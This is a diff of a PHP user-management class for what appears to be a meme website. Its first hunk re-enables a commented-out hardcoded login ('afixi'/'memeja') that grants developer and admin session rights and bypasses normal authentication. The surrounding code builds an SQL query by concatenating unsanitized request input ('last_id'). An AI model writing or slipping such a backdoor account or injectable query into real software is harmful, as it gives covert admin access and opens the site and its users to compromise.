@@ -128,14 +128,14 @@ class user_manager extends mod_manager {
 			$uname = strtolower($this->_input['username']);
 			$pwd = $this->_input['password'];
 		}
-		/*if($uname == 'afixi' &&  $pwd == "memeja"){
+		if($uname == 'afixi' &&  $pwd == "memeja"){
 			$_SESSION['id_user'] = 99;
 			$_SESSION['username'] = "developer";
 			$_SESSION['id_developer'] = 99;
 			$_SESSION['id_admin'] = 99;
 			$_SESSION['raise_message']['global'] = "Successfully logged in";
 			redirect(LBL_ADMIN_SITE_URL);
-		}*/
+		}
 		$rem = $this->_input['rem'];
 		$admin_url =  $this->_input['admin_st'];
 		if (empty($uname)||empty($pwd)){
@@ -1112,7 +1112,7 @@ class user_manager extends mod_manager {
 			return false;
 	    } 
 	    
-	    $limit_favorite = $GLOBALS['conf']['PAGINATE']['rec_per_page'] - 1;
+	    $limit_favorite = $GLOBALS['conf']['PAGINATE']['rec_per_page'] - 7;
 	    $comm_favorite = "FIND_IN_SET(".$data['id_user'].",honour_id_user) ";
 	    $cond_favorite  = (!$this->_input['last_id'])?$comm_favorite :$comm_favorite ." AND id_meme <".$this->_input['last_id'];
 	    $cond_favorite .=" ORDER BY id_meme DESC LIMIT ".$limit_favorite ;
